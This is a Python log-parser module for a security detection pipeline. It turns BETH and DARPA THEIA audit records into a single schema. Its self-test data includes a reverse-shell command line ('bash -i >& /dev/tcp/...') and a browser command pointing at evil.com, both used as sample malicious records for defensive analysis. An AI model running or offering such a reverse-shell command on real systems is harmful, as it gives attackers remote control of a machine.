"""
tools/log_parser.py
Pipeline entry point.  Parses raw log records into a unified dict consumed
by all downstream tools.  No Neo4j interaction — pure parsing only.

Supported input formats
───────────────────────
  1. Flat BETH CSV-as-JSON  (original training format):
        {"processId": 7307, "hostName": "...", "sus": 1, "evil": 0, ...}

  2. Nested BETH event JSON (test-file format from part_N.json):
        {
          "event":    {"eventName": "...", "sus": 1, "evil": 0,
                       "is_network_op": false, "is_delete_op": false, ...},
          "process":  {"processId": 7307, "parentProcessId": 7102,
                       "processName": "sshd"},
          "host":     {"hostName": "ip-10-100-1-217"},
          "user":     {"userId": 0, "is_root": true},
          "file_path":{"pathname": "/etc/shadow", "flags_category": "write"},  # optional
          "socket":   {"domain": "AF_INET", "type": "SOCK_STREAM"}            # optional
        }

  3. DARPA THEIA CDM Subject (UUID-keyed, JSON):
        {"uuid": "df8a8c88-...", "type": "firefox", "cmdLine": "...", ...}

BETH detection  : "processId" present at any nesting level
DARPA detection : "uuid" key present (takes precedence over processId)
Nested detection: "process" sub-dict present with "processId" inside it

Unified output schema
─────────────────────
{
    datasetTag   : "beth" | "darpa"
    pid          : int    (BETH)  | None  (DARPA)
    hostName     : str    (BETH)  | None  (DARPA)
    processName  : str
    parentPid    : int
    cmdLine      : str
    userId       : str
    timestamp    : int | float
    sus          : int
    evil         : int
    uuid         : str    (DARPA) | None  (BETH)

    # Extra fields present only for nested BETH event records:
    eventName    : str    (syscall/event name)
    isNetworkOp  : bool
    isDeleteOp   : bool
    isExecOp     : bool
    isRoot       : bool
    filePath     : str | None   (pathname if file_path block present)
    fileFlagsCategory : str | None   ("read" | "write" | etc.)
    hasSensitivePath  : bool
}
"""

import json


class LogParser:
    """
    Stateless record parser.  Call parse_record() once per incoming log line.
    Returns None on parse failure so the caller can skip invalid records.
    """

    # ── public API ────────────────────────────────────────────────────────────

    def parse_record(self, raw_input) -> dict | None:
        """
        Accept a raw JSON string or an already-parsed dict.
        Returns the unified record dict or None on failure.
        """
        if isinstance(raw_input, str):
            try:
                raw = json.loads(raw_input)
            except (json.JSONDecodeError, TypeError) as exc:
                print(f"[LogParser] ERROR — cannot parse JSON input: {exc}")
                return None
        elif isinstance(raw_input, dict):
            raw = raw_input
        else:
            print(f"[LogParser] ERROR — unsupported input type: {type(raw_input)}")
            return None

        # ---------------------------------------------------------
        # PRIORITY FIX: Must check BETH first! 
        # json_file_runner injects fake 'uuid':'unknown' which 
        # causes DARPA to falsely hijack the log if checked first.
        # ---------------------------------------------------------
        if self._is_beth_nested(raw) or ("process" in raw and "event" in raw):
            return self._parse_beth_nested(raw)
            
        if self._is_beth_flat(raw) or "processId" in raw or "sus" in raw:
            return self._parse_beth_flat(raw)
            
        if self._is_darpa(raw) or "uuid" in raw:
            return self._parse_darpa(raw)

        print(f"[LogParser] ERROR — cannot identify dataset type from keys: "
              f"{list(raw.keys())}")
        return None

    # ── detection helpers ─────────────────────────────────────────────────────

    @staticmethod
    def _is_darpa(raw: dict) -> bool:
        """DARPA CDM records carry a top-level uuid. Checked first."""
        return "uuid" in raw

    @staticmethod
    def _is_beth_nested(raw: dict) -> bool:
        """
        Nested BETH event format: top-level 'process' sub-dict that itself
        contains 'processId'.  Used by the part_N.json test files.
        """
        return (
            isinstance(raw.get("process"), dict)
            and "processId" in raw["process"]
        )

    @staticmethod
    def _is_beth_flat(raw: dict) -> bool:
        """Original flat BETH format: processId at the top level."""
        return "processId" in raw

    # ── parsers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _parse_beth_flat(raw: dict) -> dict:
        """
        BETH CSV row serialised as flat JSON (training / validation format).
        """
        pid        = int(raw.get("processId", raw.get("pid", 0)))
        host_name  = str(raw.get("hostName", raw.get("host_name", "unknown")))
        proc_name  = str(raw.get("processName") or raw.get("name", "unknown"))
        parent_pid = int(raw.get("parentProcessId", raw.get("parent_pid", 0)))
        cmd_line   = str(raw.get("cmdLine") or raw.get("args", ""))
        user_id    = str(raw.get("userId", "unknown"))
        timestamp  = float(raw.get("timestamp", 0))
        sus        = int(raw.get("sus", 0))
        evil       = int(raw.get("evil", 0))
        is_root    = str(user_id) == "0"

        record = {
            "datasetTag":  "beth",
            "pid":          pid,
            "hostName":     host_name,
            "processName":  proc_name,
            "parentPid":    parent_pid,
            "cmdLine":      cmd_line,
            "userId":       user_id,
            "timestamp":    timestamp,
            "sus":          sus,
            "evil":         evil,
            "uuid":         None,
            # Extra fields (None for flat format)
            "eventName":        None,
            "isNetworkOp":      False,
            "isDeleteOp":       False,
            "isExecOp":         False,
            "isRoot":           is_root,
            "filePath":         None,
            "fileFlagsCategory":None,
            "hasSensitivePath": False,
        }
        print(f"[LogParser] BETH-flat  PID={pid}  Host={host_name}  "
              f"Process={proc_name}  sus={sus}  evil={evil}")
        return record

    @staticmethod
    def _parse_beth_nested(raw: dict) -> dict:
        """
        Nested BETH event JSON format from part_N.json test files.
        Each record is one kernel audit event belonging to a process.
        """
        event   = raw.get("event",    {})
        process = raw.get("process",  {})
        host    = raw.get("host",     {})
        user    = raw.get("user",     {})
        fp      = raw.get("file_path",{})

        pid        = int(process.get("processId",       0))
        host_name  = str(host.get("hostName",           "unknown"))
        proc_name  = str(process.get("processName",     "unknown"))
        parent_pid = int(process.get("parentProcessId", 0))
        user_id    = str(user.get("userId",             "unknown"))
        timestamp  = float(event.get("timestamp",       0.0))
        sus        = int(event.get("sus",               0))
        evil       = int(event.get("evil",              0))
        event_name = str(event.get("eventName",         ""))
        is_root    = bool(user.get("is_root",           False))
        is_net_op  = bool(event.get("is_network_op",    False))
        is_del_op  = bool(event.get("is_delete_op",     False))
        is_exec_op = bool(event.get("is_exec_op",       False))
        file_path  = fp.get("pathname")
        flags_cat  = fp.get("flags_category")
        sensitive  = bool(fp.get("has_sensitive_path",  False))

        # cmdLine is not present in event records; use eventName + processName
        # as a proxy description for tools that rely on cmdLine
        cmd_line = event.get("cmdLine", "") or ""

        record = {
            "datasetTag":  "beth",
            "pid":          pid,
            "hostName":     host_name,
            "processName":  proc_name,
            "parentPid":    parent_pid,
            "cmdLine":      cmd_line,
            "userId":       str(user_id),
            "timestamp":    timestamp,
            "sus":          sus,
            "evil":         evil,
            "uuid":         None,
            # Extra fields from the nested event structure
            "eventName":         event_name,
            "isNetworkOp":       is_net_op,
            "isDeleteOp":        is_del_op,
            "isExecOp":          is_exec_op,
            "isRoot":            is_root,
            "filePath":          file_path,
            "fileFlagsCategory": flags_cat,
            "hasSensitivePath":  sensitive,
        }
        print(f"[LogParser] BETH-event  PID={pid}  Host={host_name}  "
              f"Process={proc_name}  event={event_name}  sus={sus}  evil={evil}")
        return record

    @staticmethod
    def _parse_darpa(raw: dict) -> dict:
        """
        DARPA THEIA CDM Subject record (AVRO → JSON).
        UUID is the primary key; processId is not reliable.
        """
        uuid       = str(raw.get("uuid") or raw.get("id", "unknown"))
        proc_name  = str(
            raw.get("processName") or raw.get("type") or raw.get("name", "unknown")
        )
        cmd_line   = str(raw.get("cmdLine") or raw.get("args", ""))
        parent_pid = int(raw.get("ppid", 0))
        user_id    = str(raw.get("userId", "unknown"))
        timestamp  = float(raw.get("timestamp", 0))

        record = {
            "datasetTag":  "darpa",
            "uuid":         uuid,
            "processName":  proc_name,
            "cmdLine":      cmd_line,
            "parentPid":    parent_pid,
            "userId":       user_id,
            "timestamp":    timestamp,
            "sus":          0,
            "evil":         0,
            "pid":          None,
            "hostName":     None,
            # Extra fields
            "eventName":         None,
            "isNetworkOp":       False,
            "isDeleteOp":        False,
            "isExecOp":          False,
            "isRoot":            str(user_id) in ("0", "root"),
            "filePath":          None,
            "fileFlagsCategory": None,
            "hasSensitivePath":  False,
        }
        print(f"[LogParser] DARPA  UUID={uuid[:16]}...  Type={proc_name}")
        return record


# ── quick test ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = LogParser()

    # 1. Flat BETH (training format)
    flat_beth = json.dumps({
        "processId": 7426, "hostName": "ip-10-100-1-217",
        "processName": "bash", "parentProcessId": 1,
        "cmdLine": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "userId": "1001", "timestamp": 650.73, "sus": 1, "evil": 0
    })
    print("=== Flat BETH ===")
    print(json.dumps(parser.parse_record(flat_beth), indent=2))

    # 2. Nested BETH event (test JSON format)
    nested_beth = json.dumps({
        "event": {
            "eventName": "setreuid", "timestamp": 411.21, "returnValue": 0,
            "sus": 1, "evil": 1, "event_category": "process",
            "is_delete_op": False, "is_exec_op": False,
            "is_network_op": False, "is_failed_syscall": False
        },
        "process": {
            "processId": 7307, "parentProcessId": 7102, "processName": "sshd"
        },
        "host":  {"hostName": "ip-10-100-1-217"},
        "user":  {"userId": 1001, "is_root": False, "is_real_user": True},
        "edges": {"process_event": "EMITS"}
    })
    print("\n=== Nested BETH event ===")
    print(json.dumps(parser.parse_record(nested_beth), indent=2))

    # 3. DARPA CDM
    darpa = json.dumps({
        "uuid": "df8a8c88-1234-4a2a-9b1b-8f8f8f8f8f8f",
        "type": "firefox", "cmdLine": "firefox --new-tab http://evil.com",
        "ppid": 1, "userId": "1000", "timestamp": 1620000000
    })
    print("\n=== DARPA ===")
    print(json.dumps(parser.parse_record(darpa), indent=2))